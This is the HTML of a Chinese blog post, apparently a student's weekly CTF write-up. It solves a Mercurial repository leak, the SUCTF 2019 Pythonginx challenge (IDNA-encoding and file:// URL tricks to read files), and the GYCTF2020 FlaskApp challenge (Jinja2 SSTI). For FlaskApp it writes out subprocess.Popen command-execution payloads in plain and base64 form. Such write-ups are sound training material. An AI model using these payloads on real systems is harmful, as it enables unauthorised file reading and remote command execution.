@@ -1,0 +1,303 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>一周CTF（二） | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="一周CTF（二） | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="完成课程任务+周末的SCTF，本周就做了下面几道。
+CTFHub
+HG泄露
+所用工具：dvcs-ripper
+./rip-hg.pl -v -u http://challenge-9bb20b0100927f28.sandbox.ctfhu..." />
+    <meta name="keywords" content="CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              一周CTF（二）
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-06-20
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/mei-zhou-ctf-shua-ti-zong-jie-er.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>完成课程任务+周末的SCTF，本周就做了下面几道。</p>
+<h1 id="ctfhub">CTFHub</h1>
+<h2 id="hg泄露">HG泄露</h2>
+<p>所用工具：dvcs-ripper</p>
+<p><code>./rip-hg.pl -v -u http://challenge-9bb20b0100927f28.sandbox.ctfhub.com:10800/.hg</code> 下载<code>.hg</code>文件，保存路径<code>./.hg</code>。</p>
+<p><code>cat .hg/store/fncache </code>，找到flag路径访问。<br /><img src="https://skyblu3519.github.io/post-images/1687268878690.png" alt="" loading="lazy"></p>
+<h1 id="buuctf">BuuCTF</h1>
+<h2 id="suctf-2019pythonginx">[SUCTF 2019]Pythonginx</h2>
+<pre><code class="language-python">from urllib.parse import urlparse, urlsplit, urlunsplit
+import urllib.request
+
+@app.route('/getUrl', methods=['GET', 'POST']) 
+def getUrl(): 
+    url = request.args.get(&quot;url&quot;) 
+    host = urlparse(url).hostname 
+
+    if host == 'suctf.cc': 
+        return &quot;我扌 your problem? 111&quot;
+
+    parts = list(urlsplit(url)) 
+    host = parts[1] 
+
+    if host == 'suctf.cc': 
+        return &quot;我扌 your problem? 222 &quot; + host
+
+    newhost = [] 
+    for h in host.split('.'): 
+        newhost.append(h.encode('idna').decode('utf-8')) 
+
+    parts[1] = '.'.join(newhost) 
+
+    finalUrl = urlunsplit(parts).split(' ')[0] 
+    host = urlparse(finalUrl).hostname 
+
+    if host == 'suctf.cc': 
+        return urllib.request.urlopen(finalUrl).read() 
+    else: 
+        return &quot;我扌 your problem? 333&quot;
+
+</code></pre>
+<p>代码用<code>urlparse</code>和<code>urlsplit</code>两次对传入url的host部分进行检查，如果为<code>suctf.cc</code>则退出。同时在最后一部分对url处理后，要求host为suctf.cc才能执行<code>urllib.request.urlopen(finalUrl).read()</code>。</p>
+<p>思路是让输入的url的host在<code>urlparse</code>和<code>urlsplit</code>的检查部分不为<code>suctf.cc</code>，在结果最后一部分处理后host又回到<code>suctf.cc</code>。</p>
+<p>现在看到最后一部分检查前代码对url的处理：</p>
+<pre><code class="language-python"># 将主机名编码为 idna 格式，用于处理包含非 ASCII 字符的主机名
+newhost = [] 
+for h in host.split('.'): 
+    newhost.append(h.encode('idna').decode('utf-8')) 
+
+parts[1] = '.'.join(newhost) 
+
+# 移除 url 中的空格，并重新构造 url
+finalUrl = urlunsplit(parts).split(' ')[0] 
+host = urlparse(finalUrl).hostname 
+</code></pre>
+<p>这里有两个思路：idna编码绕过，组合finalUrl重新出现host</p>
+<h3 id="思路一">思路一</h3>
+<p>国际化域名（Internationalized Domain Names，IDNs）是允许包含非ASCII字符（如拉丁字符以外的字符或符号）的域名。这些非ASCII字符的域名允许互联网用户使用他们自己的语言和脚本访问网络资源。这里知道idna是一种编码即可。</p>
+<p>urlparse和urlsplit在设计上还是比较安全的，但是，它们可能会在解析某些特定格式的URL时产生意外的行为。例如，这两个函数都会将包含特殊字符的主机名部分（如使用IDNA编码的URL）原样返回。</p>
+<p>题目中的代码会将原host按<code>.</code>分割，对每一部分进行idna编码。于是我们依照这种方式，找到一个字符在经过idna编码后为最后所要的值。这里选择了顶级域名中<code>'c'</code>字符，用遍历的方式，找到经过idna编码后为<code>'c'</code>的字符：</p>
+<pre><code class="language-python">for x in range(65536):
+    uni = chr(x)
+    url = f&quot;c{uni}&quot;
+    try:
+        if url.encode('idna').decode('utf-8') == 'cc':
+            print(f'Char {chr(x)}: ' + str(x))
+    except:
+        pass
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1687268899653.png" alt="" loading="lazy"></figure>
+<p>选择一个字符替换<code>suctf.cc</code>中的<code>'c'</code>。接下来用file协议读取文件：</p>
+<ul>
+<li><code>?url=file://suctf.c%E2%84%82/../../../../../usr/local/nginx/conf/nginx.conf</code>读取nginx配置文件找到flag的路径<code>/usr/fffffflag</code></li>
+<li><code>?url=file://suctf.c%E2%84%82/../../../usr/fffffflag</code>读取flag</li>
+</ul>
+<h3 id="思路二">思路二</h3>
+<p>urlunsplit()函数的作用是将URL的各个组成部分合并为完整的URL。这个函数接受一个五元素的元组作为参数，这五个元素分别代表URL的五个组成部分：scheme（方案），netloc（网络位置），path（路径），query（查询）和fragment（片段）。但这五个部分少一个urlunsplit也不会介意。</p>
+<p>于是可以输入url为<code>file:////suctf.cc/�</code>让<code>urlparse</code>和<code>urlsplit</code>对host部分解析为空，然后由<code>urlunsplit</code>对其进行拼接成一个完整的url：</p>
+<pre><code class="language-python">url = 'file:////suctf.cc/'
+part = urlparse(url)
+print(part)
+part = list(urlsplit(url))
+print(part)
+print(urlunsplit(part))
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/1687268926596.png" alt="" loading="lazy"></figure>
+<p>payload：<code>?url=file:////suctf.cc/../../usr/fffffflag</code></p>
+<h2 id="gyctf2020flaskapp">[GYCTF2020]FlaskApp</h2>
+<p><code>decode</code>存在SSTI，SSTI攻击思路：</p>
+<ul>
+<li>选择一个类，如：<code>''</code>, <code>[]</code>, <code>{}</code></li>
+<li>通过这个类找到<code>object</code>类，这是 Python 中所有类的基类：<code>__base__</code>，<code>__bases__</code>，<code>__mro__</code></li>
+<li>通过object类获取所有子类：<code>__subclasses__()</code></li>
+<li>在子类列表中找到可以利用的类</li>
+</ul>
+<p>用<code>{{&quot;&quot;.__class__.__base__.__subclasses__()}}</code>寻找可以利用的子类。这里无法输出全部，所以使用<code>{{&quot;&quot;.__class__.__base__.__subclasses__()[0:200]}}</code>逐步输出所有子类</p>
+<p>对<code>popen</code>字符串进行了过滤，但是可以用<code>subprocess.Popen</code><br /><img src="https://skyblu3519.github.io/post-images/1687268943926.png" alt="" loading="lazy"></p>
+<pre><code class="language-python"># 利用subprocess.Popen类进行RCE的payload
+{{''.__class__.__base__.__subclasses__()[286]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
+</code></pre>
+<p>payload:</p>
+<pre><code>e3siIi5fX2NsYXNzX18uX19iYXNlX18uX19zdWJjbGFzc2VzX18oKVsyODZdKCd3aG9hbWknLHNoZWxsPVRydWUsc3Rkb3V0PS0xKS5jb21tdW5pY2F0ZSgpWzBdLnN0cmlwKCl9fQ==
+</code></pre>
+<p><img src="https://skyblu3519.github.io/post-images/1687269015581.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1687886765762.png" alt="" loading="lazy"><br>
+过滤了flag<br>
+<img src="https://skyblu3519.github.io/post-images/1687886792116.png" alt="" loading="lazy"><br>
+用<code>\</code>绕过，<code>cat /this_is_the_fla\g.txt</code><br />payload：<code>text=e3siIi5fX2NsYXNzX18uX19iYXNlX18uX19zdWJjbGFzc2VzX18oKVsyODZdKCdjYXQgL3RoaXNfaXNfdGhlX2ZsYVxnLnR4dCcsc2hlbGw9VHJ1ZSxzdGRvdXQ9LTEpLmNvbW11bmljYXRlKClbMF0uc3RyaXAoKX19</code><br>
+<img src="https://skyblu3519.github.io/post-images/1687886495955.png" alt="" loading="lazy"></p>
+<h1 id="总结">总结</h1>
+<p>下周学爆！</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#ctfhub">CTFHub</a>
+<ul>
+<li><a href="#hg%E6%B3%84%E9%9C%B2">HG泄露</a></li>
+</ul>
+</li>
+<li><a href="#buuctf">BuuCTF</a>
+<ul>
+<li><a href="#suctf-2019pythonginx">[SUCTF 2019]Pythonginx</a>
+<ul>
+<li><a href="#%E6%80%9D%E8%B7%AF%E4%B8%80">思路一</a></li>
+<li><a href="#%E6%80%9D%E8%B7%AF%E4%BA%8C">思路二</a></li>
+</ul>
+</li>
+<li><a href="#gyctf2020flaskapp">[GYCTF2020]FlaskApp</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/python-ssti-xue-xi/">
+              <h3 class="post-title">
+                Python SSTI学习
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
